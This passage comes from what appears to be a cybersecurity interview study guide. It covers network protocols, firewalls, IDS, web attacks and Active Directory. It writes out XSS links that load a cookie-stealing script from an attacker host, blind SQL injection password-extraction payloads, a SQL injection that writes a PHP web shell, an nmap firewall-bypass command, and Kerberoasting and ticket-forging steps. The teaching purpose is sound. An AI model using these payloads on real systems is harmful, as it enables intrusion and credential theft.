Server.</p>","<p>Step 4</p>","<img src=\\"/cyber/blog/cybersecurityinterviewquestions/dhcp/step4.jpg\\" alt=\\"Step 4\\"></p>","<p>It is an acknowledgement packet to confirm that the server will registers client’s information.</p>","<p>ROUTING PROTOCOLS (to add)</p>","<p>OSPF (to add)</p>"]}]},{"id":"ARP Protocol","title":"<h1> <span style=\\"color:#da1953\\">ARP</span> Protocol</h1>","body":[{"id":"Introduction ARP","title":"<h2>Introduction</h2>","body":["<p>The Address Resolution Protocol (ARP) is a communication protocol used for discovering the link layer address, such as a MAC address.</p>","<p>Whenever a device needs to communicate with another device in a Local Area Network (LAN) it needs the MAC address for that device and devices use ARP protocol to acquire the MAC address for that device.</p>","<p>An IP address is used to locate a device on a network and the MAC address is what identify the actual device.</p>"]},{"id":"Operating Scope","title":"<h2>Operating Scope</h2>","body":["<p>The Address Resolution Protocol is a request-response protocol whose messages are encapsulated by a link layer protocol. It is communicated within the boundaries of a single network, never routed across internetworking nodes.</p>"]},{"id":"Arp Request/Response","title":"<h2>Arp Request/Response</h2>","body":["<p>An ARP probe is an ARP request broadcasted in to the LAN (also to the router) in search of the MAC address of a given IP and the host having the requested IP will send a response containing its MAC.</p>"]},{"id":"Operations","title":"<h2>Operations</h2>","body":["<p>Step 1</p>","<img src=\\"/cyber/blog/cybersecurityinterviewquestions/arp/step1.jpg\\" alt=\\"Step 1\\"></p>","<p>The cliet sends a broadcast message because the destination MAC address is a broadcast address, simply saying anyone with IP address <em>192.168.1.50</em> if you hear me would you please give your packages, and here is my IP address and MAC address. The other devices will discard the ARP packet silently.</p>","<p>Step 2</p>","<img src=\\"/cyber/blog/cybersecurityinterviewquestions/arp/step2.jpg\\" alt=\\"Step 2\\"></p>","<p>When the server hear the message, it sends a unicast message to the client because the detination IP address and MAC address belong to the client.</p>","<p>Step 3</p>","<img src=\\"/cyber/blog/cybersecurityinterviewquestions/arp/step3.jpg\\" alt=\\"Step 3\\"></p>","<p>The client gets the server&rsquo;s MAC address and can sends the server a request. At the same time the client updates ARP cache tablesfor the future reference.</p>"]},{"id":"ARP Spoofing","title":"<h2>ARP Spoofing</h2>","body":["<p>ARP spoofing is a technique that allows an attacker to craft a &ldquo;fake&rdquo; ARP packet that looks like it came from a different source, or has a fake MAC address in it.</p>"]},{"id":"ARP Poisoning","title":"<h2>ARP Poisoning</h2>","body":["<p>An attacker uses the process of ARP spoofing to &ldquo;poison&rdquo; a victim&rsquo;s ARP table, so that it contains incorrect or altered IP-to-MAC address mappings for various attacks, such as a man-in-the-middle attack.</p>","<p>In computer networking, ARP cache poisoning, performend on a switch, is a technique by which an attacker sends (spoofed) Address Resolution Protocol (ARP) messages onto a local area network. Generally, the aim is to associate the attacker&rsquo;s MAC address with the IP address of another host, such as the default gateway, causing any traffic meant for that IP address to be sent to the attacker instead.</p>","<p><img src=\\"/cyber/blog/cybersecurityinterviewquestions/arp/arpspoofing.jpg\\" alt=\\"ARPSpoofing\\"></p>"]}]},{"id":"Firewall","title":"<h1> <span style=\\"color:#da1953\\">Fir</span>ewall</h1>","body":[{"id":"Network Layer Firewall or Packet Filters","title":"<h2>Network Layer Firewall or Packet Filters</h2>","body":["<p>Network layer firewalls, also called packet filters, operate at a relatively low level of the TCP/IP stack, blocking packets unless they match the established rule set. The firewall administrator may define the rules; or default rules may apply.</p>","<p>Network layer firewalls generally fall into two sub-categories, stateful and stateless.</p>","<p>A stateful firewall is a network firewall that tracks the operating state and characteristics of network connections traversing it. The firewall is configured to distinguish legitimate network packets for different types of connections. Only packets matching a known active connection are allowed to pass the firewall. In contrast a stateless firewall does not take context into account when determining whether to allow or block packets.</p>","<p>There are other type of filters such as Application-Layer Firewall that filter preprocesses packets depending on the source/destination application, Proxies may act as a firewall by responding to input packets (connection requests, for example) in the manner of an application, while blocking other packets, Network Address Translation (NAT) may hide the true address of computer which is connected to the network.</p>","<p><ul><li>A firewall restrict access from outside</li><li>Prevent attackers from getting too close</li><li>Restrict people from leaving</li></ul></p>"]},{"id":"Packet filters (stateless firewall)","title":"<h2>Packet filters (stateless firewall)</h2>","body":["<p><ul><li>Drop packets based on their source or destination addresses or port numbers or flags</li><li>No context, only contents</li><li>Can operate on<ul><li>Incoming interface</li><li>Outgoing interface</li><li>Both</li></ul></li><li>Check packets with fake IP addresses:<ul><li>From outside (“ingress iltering”)</li><li>From inside (“egress filtering”)</li></ul></li></ul></p>"]},{"id":"Problems with Packet Filters","title":"<h2>Problems with Packet Filters</h2>","body":["<p><ul><li>Payload of TCP packet is not inspected.<ul><li>No protection against attacks based on upper-layer vulnerabilities.</li></ul></li><li>Limited logging ability (restricted to the few parameters used by the filter).</li><li>No authentication facilities.</li><li>Susceptible to attacks based on ulnerabilities in various implementations of TCP and/or IP.</li></ul></p>"]},{"id":"Stateful packet inspection","title":"<h2>Stateful packet inspection</h2>","body":["<p><ul><li>Stateful Inspection Firewalls (or Dynamic Packet Filters) can keep track of established connections.</li><li>Can drop packets based on their source or destination IP addresses, port numbers and possibly TCP flags.<ul><li>Solve one major problem of simple packet filters, since they can check that incoming traffic for a high-numbered port is a genuine response to a previous outgoing request to set up a connection.</li></ul></li></ul></p>","<p><img src=\\"/cyber/blog/cybersecurityinterviewquestions/firewall/dynamicpacketfilter.jpg\\" alt=\\"Dynamic packet filter\\"></p>"]},{"id":"Common firewall weaknesses","title":"<h2>Common firewall weaknesses</h2>","body":["<p><ul><li>No content inspection causes the problems.<ul><li>Software weakness (e.g. buffer overflow, and SQL injection exploits).</li><li>Protocol weakness (WEP in 802.11).</li></ul></li><li>No defense against.<ul><li>Denial of service.</li><li>Insider attacks.</li></ul></li><li>Firewall failure has to be prevented.<ul><li>Firewall cluster for redundancy.</li></ul></li></ul></p>"]}]},{"id":"IDS (Intrusion Detection System)","title":"<h1> <span style=\\"color:#da1953\\">IDS</span> (Intrusion Detection System)</h1>","body":["<p>An intrusion detection system (IDS) is a device or software application that monitors a network or systems for malicious activity.</p>","<p>An Intrusion Detection System (IDS) aims at detecting the presence of intruders before serious damage is done.</p>","<p>The ultimate purpose of an intruder could be to:</p>","<ul><li>Prevent the legitimate users from using the system.</li><li>Reveal confidential information.</li><li>Use the system as a stepping stone to attack other systems.</li></ul>","<p>Second generation IDS are IPS, Intrusion Prevention Systems, also produce responses to suspicious activity, for example, by modifying firewall rules or blocking switches ports.</p>","<p><img src=\\"/cyber/blog/cybersecurityinterviewquestions/ids/ids.jpg\\" alt=\\"Ids\\"></p>","<p>An IDS (passive detection) can only detect and rise alarm of malicious activities and report it to the network administrator or SIEM.</p>",{"id":"Types of IDS","title":"<h2>Types of IDS</h2>","body":["<p><ul><li>Host-based (HIDS):<ul><li>Monitors events in a single host to detect suspicious activity.</li><li>Typically deployed on critical hosts offering public services.</li><li>Advantage: better visibility into behavior of individual applications running on the host.</li></ul></li><li>Network-based (NIDS):<ul><li>Analyses network, transport and application protocol activity.</li><li>Often placed behind a router or firewall that is the entrance of a critical asset.</li><li>Advantage: single NIDS/IPS can protect many hosts and detect global patterns.</li></ul></li><li>Wireless (WIDS):<ul><li>Analyses wireless networking protocol activity (not T- or A-layers).</li><li>Typically deployed in or near an organization&rsquo;s wireless network.</li></ul></li></ul></p>"]},{"id":"IDS detection approach","title":"<h2>IDS detection approach</h2>","body":["<p><ul><li>Behavior-based (anomaly detection):<ul><li>Define behavioral characteristics of normal behavior.</li><li>Compare actual behavior with these. If there are significant differences, raise an alarm.</li><li>Difficult to define all possible normal behavior. New activities often give &ldquo;false positives&rdquo; (i.e. normal behavior classified as intrusion).</li></ul></li><li>Signature based (misuse detection):<ul><li>Define characteristics of various types of abnormal activities.</li><li>Compare actual behavior with these. If any of them match, raise alarm!.</li><li>Difficult to produce a complete catalog of abnormal activities.<ul><li>If any are missing, there will be &ldquo;false negatives&rdquo; (i.e. undetected intrusions)</li></ul></li></ul></li></ul></p>"]},{"id":"Signature-based IDS","title":"<h2>Signature-based IDS</h2>","body":["<p><ul><li>Starts from the idea that intruders/attacks may have a characteristic appearance which makes it possible to identify them.</li><li>The idea is to screen the PAYLOADS of the packets looking for specific patterns -&gt; no security signatures.</li><li>Suppliers of IDSs maintain huge databases of signatures (code or data fragments) which characterize various classes of intruder.</li><li>Rapid recognition involves searching for matches for one or more of the known signatures from a collection of many thousands of signatures</li></ul></p>"]},{"id":"Signature-based IDS principles","title":"<h2>Signature-based IDS principles</h2>","body":["<p><ul><li>A packet sniffer on steroids.</li><li>Passive capturer of the packets in a LAN, it can bring to bear on the packets some fairly complex logic to decide whether an intrusion has taken place<ul><li>SNORT is one of the best-known intrusion detectors<ul><li>Easy-to-learn and easy-to-use rule language for intrusion detection</li><li>The rules are stored in /etc/snort/rules directory</li></ul></li></ul></li><li>Con: can&rsquo;t inspect encrypted traffic (VPNs, SSL)</li><li>Con: not all attacks arrive from the network</li><li>Con: record and process huge amount of traffic</li></ul></p>"]}]},{"id":"XSS (Cross Site Scripting)","title":"<h1> <span style=\\"color:#da1953\\">XSS</span> (Cross Site Scripting)</h1>","body":[{"id":"Introduction","title":"<h2>Introduction</h2>","body":["<p>It is a type of security vulnerability typically found in web applications. XSS attacks enable attackers to inject client-side scripts into web pages viewed by other users. A cross-site scripting vulnerability may be used by attackers to bypass access controls such as the same-origin policy.</p>"]},{"id":"Examples","title":"<h2>Examples</h2>","body":["<ul><li><p><strong>Reflected</strong>: In a vulnerable website e query can be crafted in order to execute a custom script<br><code>http://bobssite.org/search?q=puppies&lt;script%20src=&quot;http://mallorysevilsite.com/authstealer.js&quot;&gt;&lt;/script&gt;</code><br>or encode the ASCII characters with percent-encoding, such as<br><code>http://bobssite.org/search?q=puppies%3Cscript%2520src%3D%22http%3A%2F%2Fmallorysevilsite.com%2Fauthstealer.js%22%3E%3C%2Fscript%3E</code>.<br>If this link is sent to the victim he/she will execute the script <em>authstealer.js</em> and any operation written there can be executed such as stealing authentication cookies and log in as him/her.</p></li><li><p><strong>Stored</strong>: In this case the script is put in a text are or wherever a user can write such as comments of posts, review etc&hellip;If the site is vulnerable in the text are HTML commands can be execute so a proper XSS exploit can be crafted<br><code>I love the puppies in this story! They\'re so cute!&lt;script src=&quot;http://mallorysevilsite.com/authstealer.js&quot;&gt;</code>).<br>If the link is clicked the script <em>authstealer.js</em> will run and operations will be executed.</p></li><li><p><strong>DOM Based XSS</strong></p></li></ul>","<p><a href=\\"https://www.youtube.com/watch?v=A5faK0BC8cE\\">https://www.youtube.com/watch?v=A5faK0BC8cE</a></p>"]}]},{"id":"CSRF","title":"<h1> <span style=\\"color:#da1953\\">CSR</span>F</h1>","body":["<p>CSRF is an attack that tricks the victim into submitting a malicious request. It inherits the identity and privileges of the victim to perform an undesired function on the victim’s behalf. Therefore, if the user is currently authenticated to the site, the site will have no way to distinguish between the forged request sent by the victim and a legitimate request sent by the victim.</p>","<p>CSRF attacks target functionality that causes a state change on the server, such as changing the victim’s email address or password, or purchasing something.</p>","<p>It’s sometimes possible to store the CSRF attack on the vulnerable site itself. Such vulnerabilities are called “stored CSRF flaws”. This can be accomplished by simply storing an IMG or IFRAME tag in a field that accepts HTML, or by a more complex cross-site scripting attack. If the attack can store a CSRF attack in the site, the severity of the attack is amplified. In particular, the likelihood is increased because the victim is more likely to view the page containing the attack than some random page on the Internet. The likelihood is also increased because the victim is sure to be authenticated to the site already.</p>"]},{"id":"Active Directory","title":"<h1> <span style=\\"color:#da1953\\">Act</span>ive Directory</h1>","body":[{"id":"Introduction AD","title":"<h2>Introduction</h2>","body":["<p>Active Directory (AD) is a directory service developed by Microsoft. A server running Active Directory Domain Service (AD DS) role is called a domain controller. It authenticates and authorizes all users and computers in a Windows domain type network—assigning and enforcing security policies for all computers and installing or updating software. For example, when a user logs into a computer that is part of a Windows domain, Active Directory checks the submitted password and determines whether the user is a system administrator or normal user. Also, it allows management and storage of information and provides authentication and authorization mechanisms.</p>"]},{"id":"Services","title":"<h2>Services</h2>","body":["<p>Active Directory Services consist of multiple directory services.</p>",{"id":"Domain Service","title":"<h3>Domain Service</h3>","body":["<p>Active Directory Domain Services (AD DS) is the foundation stone of every Windows domain network. It stores information about members of the domain, including devices and users, verifies their credentials and defines their access rights. The server running this service is called a domain controller. A domain controller is contacted when a user logs into a device, accesses another device across the network, or runs a line-of-business Metro-style app sideloaded into a device.</p>","<p>Other Active Directory services (excluding LDS, as described below) as well as most of Microsoft server technologies rely on or use Domain Services; examples include Group Policy, Encrypting File System, BitLocker, Domain Name Services, Remote Desktop Services, Exchange Server and SharePoint Server.</p>"]}]},{"id":"Common Attacks","title":"<h2>Common Attacks</h2>","body":[{"id":"Kerberosting","title":"<h3>Kerberosting</h3>","body":["<p>This attack can be carried out by any user on a domain—not just administrators. It is an “offline” attack that doesn&rsquo;t require any packets be sent to the targeted service—traffic that would be logged and quite possibly trigger alerts. At its core, Kerberoasting is a password-cracking attack in which credentials are stolen from memory and cracked offline.</p>","<p><ul><li>Kerberoasting is a post-exploitation attack that extracts service account credential hashes from Active Directory for offline cracking.</li><li>Kerberoasting is a common, pervasive attack that exploits a combination of weak encryption and poor service account password hygiene.</li><li>Kerberoasting is effective because an attacker does not require domain administrator credentials to pull off this attack and can extract service account credential hashes without sending packets to the target.</li></ul></p>","<p>Kerberoasting enables privilege escalation and lateral network movement. Kerberoasting is used by attackers once they are established inside an enterprise network and have begun reconnaissance for lateral movement. The technique allows the attackers, as valid domain users, to request a Kerberos service ticket for any service, capture that ticket granting service (TGS) ticket from memory, and then attempt to crack the service credential hash offline using any number of password-cracking tools, such as Hashcat, John the Ripper, and others.</p>","<p>Steps to compromise service with SPN:</p>","<p><ul><li>Get SPN (Service Principle Name) via script <code>GetUserSPNs.py</code>.</li><li>Choose a SPN and request a ticket with the choosen SPN, susually the choosen SPN with high priviledge in order to priviledge escalete.</li><li>The ticket will be in the memory encrypted with the NTLM hash of the password of the service account.</li><li>Use Mimikatz to dump the ticket from memory.</li><li>Crack the ticket offline with any tool.</li></ul></p>","<p>or GetUserSPNs from Imapcket Suite can  be used to list and retrive the service ticket and then crack it offline (<a href=\\"https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#kerberoasting\\">tutorial</a>).</p>"]},{"id":"Silver ticket","title":"<h3>Silver ticket</h3>","body":["<p>This technique requires a cracked service password which can be obtained via Kerberosting attack.</p>","<p><ul><li>Crack the password of a Service account obtained from Kerberosting attack.</li><li>Attacker converts the password in NTLM Hash of the service account.</li><li>Using Mimikatz forge a TGS ticket using NTLM hash of the service account.</li><li>Attacker uses the ticket to access a specific service on a target host bypassing any communication with the Active Directory Domain Controller.</li><li>Attacker is able to forge Privileged Account Certificate and other information as part of the service ticket.</li></ul></p>","<p><a href=\\"https://www.youtube.com/watch?v=GTJyd-AMfuM\\">https://www.youtube.com/watch?v=GTJyd-AMfuM</a></p>"]},{"id":"Golden ticket","title":"<h3>Golden ticket</h3>","body":["<p><ul><li>Once an attacker has obtained priviledged access to Active Directory, they can use Mimikatz to extract the KRBTGT (Kerberos Ticket Granting Ticket) accounts password hash, in addition to the name and the SID of the domainto which the KRBTGT account belongs.</li><li>Using Mimikatz the attacker generates a ticket (a golden ticket) leveraging various command and paramenters.</li><li>Once the golden ticket has been generated, the attacker will perform <em>Pass-The-Ticket</em> attack by loading the ticket into the current session providing them access to any resource connected to Active Directory.</li></ul></p>","<p><a href=\\"https://www.youtube.com/watch?v=f6SleGakcE0\\">https://www.youtube.com/watch?v=f6SleGakcE0</a></p>"]}]}]},{"id":"Subnetting and calculations","title":"<h1> <span style=\\"color:#da1953\\">Sub</span>netting and calculations</h1>","body":["<table>    <tr>      <th>Property</th>      <th>Value</th>      <th>Binary Representation</th>    </tr>    <tr>      <td>Address</td>      <td>192.168.0.1</td>      <td>11000000.10101000.00000000.00000001</td>    </tr>    <tr>      <td>Netmask</td>      <td>255.255.255.0 / 24</td>      <td>11111111.11111111.11111111.00000000</td>    </tr>    <tr>      <td>Wildcard</td>      <td>0.0.0.255</td>      <td>00000000.00000000.00000000.11111111</td>    </tr>    <tr>      <td>Network</td>      <td>192.168.0.0/24 (Class C)</td>      <td>11000000.10101000.00000000.00000000</td>    </tr>    <tr>      <td>Broadcast</td>      <td>192.168.0.255</td>      <td>11000000.10101000.00000000.11111111</td>    </tr>    <tr>      <td>HostMin</td>      <td>192.168.0.1</td>      <td>11000000.10101000.00000000.00000001</td>    </tr>    <tr>      <td>HostMax</td>      <td>192.168.0.254</td>      <td>11000000.10101000.00000000.11111110</td>    </tr>    <tr>      <td>Hosts/Net</td>      <td>254 (Private Internet)</td>      <td>-</td>    </tr>  </table></body>","<p>192.168.0.0 identifies the whole network.</p>","<p>192.168.0.255 broadcast address.</p>","<p>Assignable IPs goes from 192.168.0.1 to 192.168.0.254</p>","<p>&ldquo;Explain how to calculate subnet&rdquo;</p>"]},{"id":"DNS","title":"<h1> <span style=\\"color:#da1953\\">DNS</span></h1>","body":["<p>The Domain Name System (DNS) is a hierarchical and decentralized naming system for computers, services, or other resources connected to the Internet or a private network. It translates domain names into IP addresses needed for locating and identifying computer services and devices.</p>",{"id":"Name Server","title":"<h2>Name Server</h2>","body":["<p>he Domain Name System is maintained by a distributed database system, which uses the client–server model. The nodes of this database are the name servers. Each domain has at least one authoritative DNS server that publishes information about that domain and the name servers of any domains subordinate to it.</p>","<p><img src=\\"/cyber/blog/cybersecurityinterviewquestions/dns/domainnamesystem.png\\" alt=\\"DomainNameSystem\\"></p>"]},{"id":"Authoritative Name Server","title":"<h2>Authoritative Name Server</h2>","body":["<p>An authoritative name server is a name server that only gives answers to DNS queries ((NS) records) from data that has been configured by an original source, for example, the domain administrator or by dynamic DNS methods.</p>","<p>An authoritative name server can either be a primary server or a secondary server. A primary server is a server that stores the original copies of all zone records. A secondary server uses a special automatic updating mechanism in the DNS protocol in communication with its primary to maintain an identical copy of the primary records.</p>","<p><img src=\\"/cyber/blog/cybersecurityinterviewquestions/dns/dnshierarchy.jpg\\" alt=\\"DNSHierarchy\\"></p>"]},{"id":"Address Resolution Mechanism","title":"<h2>Address Resolution Mechanism</h2>","body":[{"id":"Iterative Address Relosution","title":"<h3>Iterative Address Relosution</h3>","body":["<p>In Iterative DNS Query, when a DNS Client asks the DNS server for name resolution, the DNS Server provides the best answer it has. If the DNS Server doesn&rsquo;t know the answer to the DNS Query from Client, the answer can be a reference to another lower level DNS Server also. This lower level DNS Server is delegated at the higher level DNS Server to be Authoritative for the DNS namespace which the DNS Query is related with. Once the DNS Client get the referral from higher level DNS Server, it can then send a DNS Query to the lower level DNS server, got as referral.</p>","<p><img src=\\"/cyber/blog/cybersecurityinterviewquestions/dns/iterativequery.png\\" alt=\\"InterativeQuery\\"></p>"]},{"id":"Recursive Address Resolution","title":"<h3>Recursive Address Resolution</h3>","body":["<p>A recursive query is a kind of query, in which the DNS server, who received your query will do all the job of fetching the answer, and giving it back to you. During this process, the DNS server might also query other DNS server&rsquo;s in the internet on your behalf, for the answer.</p>","<p><img src=\\"/cyber/blog/cybersecurityinterviewquestions/dns/recursivequery.jpg\\" alt=\\"RecursiveQuery\\"></p>"]}]}]},{"id":"Same Origin Policy","title":"<h1> <span style=\\"color:#da1953\\">Sam</span>e Origin Policy</h1>","body":["<p>The same-origin policy is a web browser security mechanism that aims to prevent websites from attacking each other.</p>","<p>The same-origin policy restricts scripts on one origin from accessing data from another origin. An origin consists of a URI scheme, domain and port number. This policy prevents a malicious script on one page from obtaining access to sensitive data on another web page through that page&rsquo;s Document Object Model.  For example, consider the following URL:</p>","<p><code>http://normal-website.com/example/example.html</code></p>","<p>This uses the scheme http, the domain normal-website.com, and the port number 80. The following table shows how the same-origin policy will be applied if content at the above URL tries to access other origins:</p>","<table><thead><tr><th>URL accessed</th><th>Access permitted?</th></tr></thead><tbody><tr><td>http: //normal-website.com/example/</td><td>Yes: same scheme, domain, and port</td></tr><tr><td>http: //normal-website.com/example2/</td><td>Yes: same scheme, domain, and port</td></tr><tr><td>https: //normal-website.com/example/</td><td>No: different scheme and port</td></tr><tr><td>http: //en.normal-website.com/example/</td><td>No: different domain</td></tr><tr><td>http: //www.normal-website.com/example/</td><td>No: different domain</td></tr><tr><td>http: //normal-website.com:8080/example/</td><td>No: different port*</td></tr></tbody></table>","<p>When a browser sends an HTTP request from one origin to another, any cookies, including authentication session cookies, relevant to the other domain are also sent as part of the request. This means that the response will be generated within the user&rsquo;s session, and include any relevant data that is specific to the user. Without the same-origin policy, if you visited a malicious website, it would be able to read your emails from GMail, private messages from Facebook, etc.</p>"]},{"id":"Question and Answer","title":"<h1> <span style=\\"color:#da1953\\">Que</span>stion and Answer</h1>","body":[{"id":"Difference between XSS and CSRF","title":"<h2>Difference between XSS and CSRF</h2>","body":["<p>Cross-site scripting (or XSS) allows an attacker to execute arbitrary JavaScript within the browser of a victim user. Cross-site request forgery (or CSRF) allows an attacker to induce a victim user to perform actions that they do not intend to.</p>","<p>The consequences of XSS vulnerabilities are generally more serious than for CSRF vulnerabilities:</p>","<p><ul><li>CSRF often only applies to a subset of actions that a user is able to perform.  Conversely, a successful XSS exploit can normally induce a user to perform any action that the user is able to perform, regardless of the functionality in which the vulnerability arises.</li><li>CSRF can be described as a &ldquo;one-way&rdquo; vulnerability, in that while an attacker can induce the victim to issue an HTTP request, they cannot retrieve the response from that request. Conversely, XSS is &ldquo;two-way&rdquo;, in that the attacker&rsquo;s injected script can issue arbitrary requests, read the responses, and exfiltrate data to an external domain of the attacker&rsquo;s choosing.</li></ul></p>"]},{"id":"Describe Cross Site Request Forgery (CSRF)","title":"<h2>Describe Cross Site Request Forgery (CSRF)</h2>","body":["<p>Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they’re currently authenticated. With a little help of social engineering (such as sending a link via email or chat), an attacker may trick the users of a web application into executing actions of the attacker’s choosing. If the victim is a normal user, a successful CSRF attack can force the user to perform state changing requests like transferring funds, changing their email address, and so forth. If the victim is an administrative account, CSRF can compromise the entire web application.</p>","<p>It’s sometimes possible to store the CSRF attack on the vulnerable site itself. Such vulnerabilities are called “stored CSRF flaws”. This can be accomplished by simply storing an IMG or IFRAME tag in a field that accepts HTML, or by a more complex cross-site scripting attack.</p>"]},{"id":"Can CSRF tokens prevent XSS attacks?","title":"<h2>Can CSRF tokens prevent XSS attacks?</h3>","body":["<p>Some XSS attacks can indeed be prevented through effective use of CSRF tokens. Consider a simple reflected XSS vulnerability that can be trivially exploited like this: <code>https://insecure-website.com/status?message=&lt;script&gt;/*+Bad+stuff+here...+*/&lt;/script&gt;</code></p>","<p>Now, suppose that the vulnerable function includes a CSRF token:</p>","<p><code>https://insecure-website.com/status?csrf-token=CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz&amp;message=&lt;script&gt;/*+Bad+stuff+here...+*/&lt;/script&gt;</code></p>","<p>Assuming that the server properly validates the CSRF token, and rejects requests without a valid token, then the token does prevent exploitation of the XSS vulnerability. The clue here is in the name: &ldquo;cross-site scripting&rdquo;, at least in its reflected form, involves a cross-site request. By preventing an attacker from forging a cross-site request, the application prevents trivial exploitation of the XSS vulnerability.</p>"]},{"id":"What are the phases of a penetration test?","title":"<h2>What are the phases of a penetration test?</h2>","body":["<p><ul><li>Information Gathering</li><li>Reconnaissance</li><li>Discovery and Scanning</li><li>Vulnerability Assessment</li><li>Exploitation</li><li>Post Exploitation</li></ul></p>"]},{"id":"What is the difference between a risk assessment, vulnerability assessment, and penetration test?","title":"<h2>What is the difference between a risk assessment, vulnerability assessment, and penetration test?</h2>","body":["<p>Risk Assessment is composed by 5 steps:</p>","<p><ul><li><strong>Context establishment</strong>: Identify and describe the context of the Risk Assessment process, considering external and internal context. Must contain identification of the party involved, assumption declaration, relevant assets for RA, risk scales definition, risk evaluation criteria.</li><li><strong>Risk identification</strong>: is the set of activities aiming to identify, describe, and document risks and possible causes of risk.<ul><li>Identify threats and understand how may lead to incident.</li></ul></li><li><strong>Risk Analysis</strong>: is the activity aiming to estimate and determine the level of the identified risks, the level is derived from the combination of the likelihood and consequence. Likelihood estimation is to determine the frequency or probability of incidents to occur using the defined likelihood scale.</li><li><strong>Risk Evaluation</strong>: is the set of activities involving the comparison of the risk analysis results with the risk evaluation criteria to determine which risks should be considered for treatment.</li><li><strong>Risk Treatment</strong>: The risk treatment is the set of activities aiming to identify and select means for risk mitigation and reduction<ul><li>Reduction: reduce the likelihood or the consequence of incidents</li><li>Retention: Accept the risk</li><li>Avoidance: avoid the activity that rise to the risk in question</li><li>Sharing: transfer the risk to another party, like an insurance or sub-contracting</li></ul></li></ul</p>","<p>A vulnerability assessment is a systematic review of security weaknesses in an information system. It evaluates if the system is susceptible to any known vulnerabilities, assigns severity levels to those vulnerabilities, and recommends remediation or mitigation, if and whenever needed.</p>","<p>A penetration testing is an authorized simulated cyberattack on a computer system, performed to evaluate the security of the system; this is not to be confused with a vulnerability assessment. The test is performed to identify weaknesses (also referred to as vulnerabilities), including the potential for unauthorized parties to gain access to the system&rsquo;s features and data. Pen testing can involve the attempted breaching of any number of application systems, (e.g., application protocol interfaces (APIs), frontend/backend servers) to uncover vulnerabilities, such as unsanitized inputs that are susceptible to code injection attacks.</p>"]},{"id":"What is the difference between ARP Spoofing and ARP Poisoning?","title":"<h2>What is the difference between ARP Spoofing and ARP Poisoning?</h2>","body":["<p>ARP poisoning is an attack that is accomplished using the technique of ARP spoofing.</p>","<p>ARP spoofing is a technique that allows an attacker to craft a &ldquo;fake&rdquo; ARP packet that looks like it came from a different source, or has a fake MAC address in it.</p>","<p>An attacker uses the process of ARP spoofing to &ldquo;poison&rdquo; a victim&rsquo;s ARP table, so that it contains incorrect or altered IP-to-MAC address mappings for various attacks, such as a man-in-the-middle attack.</p>"]},{"id":"When running an nmap scan, what source port can you specify to scan from to commonly bypass firewall rules?","title":"<h2>When running an nmap scan, what source port can you specify to scan from to commonly bypass firewall rules?</h2>","body":["<p>A common error that many administrators are doing when configuring firewalls is to set up a rule to allow all incoming traffic that comes from a specific poert number. The <em>source-port</em> option of Nmap can be used to exploit this missconfiguration. Common ports that you can use for this type of scan are: 20, 53 and 67. <code>nmap --source-port 53 &lt;IP/Host&gt;</code></p>"]},{"id":"Differences between Netcat and Ncat","title":"<h2>Differences between Netcat and Ncat</h3>","body":["<p><em>nc</em> and <em>netcat</em> are two names for the same program (typically, one will be a symlink to the other). It is a computer networking utility for reading from and writing to network connections using TCP or UDP.</p>","<p><em>Ncat</em> is the same idea, but from the Nmap project. Ncat was written for the Nmap Project as a much-improved reimplementation of the venerable Netcat.</p>"]},{"id":"What about Blind SQL Injection and how is it different from other kinds?","title":"<h2>What about Blind SQL Injection and how is it different from other kinds?</h2>","body":["<p>Blind SQL injection arises when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.</p>","<p>With blind SQL injection vulnerabilities, many techniques such as UNION attacks, are not effective because they rely on being able to see the results of the injected query within the application&rsquo;s responses. It is still possible to exploit blind SQL injection to access unauthorized data, but different techniques must be used.</p>","<p>In this situation there is no result of the query but a feedback from the application which can be any arbitrary string, while in case of failure there will be no type of response. For example, suppose there is a table called Users with the columns Username and Password, and a user called Administrator. We can systematically determine the password for this user by sending a series of inputs to test the password one character at a time.</p>","<p>To do this, we start with the following input:</p>","<p><code>xyz\' AND SUBSTRING((SELECT Password FROM Users WHERE Username = \'Administrator\'), 1, 1) &gt; \'r</code></p>","<p><code>xyz\' AND SUBSTRING((SELECT Password FROM Users WHERE Username = \'Administrator\'), 1, 1) &gt; \'o</code></p>","<p><code>xyz\' AND SUBSTRING((SELECT Password FROM Users WHERE Username = \'Administrator\'), 1, 1) &gt; \'o</code></p>","<p><code>xyz\' AND SUBSTRING((SELECT Password FROM Users WHERE Username = \'Administrator\'), 1, 1) &gt; \'t</code></p>","<p>When a letter give a feedback it means that the letter is part of the password, many other techniques may be found <a href=\\"https://portswigger.net/web-security/sql-injection/blind\\">here</a>.</p>"]},{"id":"How can SQL Injection lead to remote code execution?","title":"<h2>How can SQL Injection lead to remote code execution?</h2>","body":["<p>With SQL Injection we can write a php web shell file in order to exececute it later and inject commands.</p>","<p><code>\' union select 1, \'&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;\' into outfile \'/var/www/dvwa/cmd.php\' #</code></p>","<p>If this worked properly, we should now be able to access our shell via URL and by supplying a system command as a parameter.</p>","<p><code>domain/path/cmd.php?cmd=whoami</code></p>"]},{"id":"Describe Remote Command Execution (RCE)","title":"<h2>Describe Remote Command Execution (RCE)</h2>","body":["<p>Remote code execution is a major security lapse, and the last step along the road to complete system takeover. After gaining access, an attacker will attempt to escalate their privileges on the server, install malicious scripts, or make your server part of a botnet to be used at a later date.</p>"]},{"id":"How do you exploit the Shellshock vulnerability and what can an attacker do with it?","title":"<h2>How do you exploit the Shellshock vulnerability and what can an attacker do with it?</h2>","body":[""]},{"id":"How would you bypass DEP or ASLR","title":"<h2>How would you bypass DEP or ASLR</h2>","body":[""]},{"id":"Switch vs Router","title":"<h2>Switch vs Router</h2>","body":[""]},{"id":"Simmetric key algorithm and Key lenght","title":"<h2>Simmetric key algorithm and Key lenght</h2>","body":["..."]},{"id":"More Q&amp;A from GitHb","title":"<h2>More Q&amp;A from GitHb</h2>","body":["<p><a href=\\"https://danielmiessler.com/study/infosec_interview_questions/\\">https://danielmiessler.com/study/infosec_interview_questions/</a></p>","<p><a href=\\"https://github.com/justinltodd/security-interview-questions\\">https://github.com/justinltodd/security-interview-questions</a></p>","<p><a href=\\"https://github.com/DopplerHQ/awesome-interview-questions\\">https://github.com/DopplerHQ/awesome-interview-questions</a></p>","<p><a 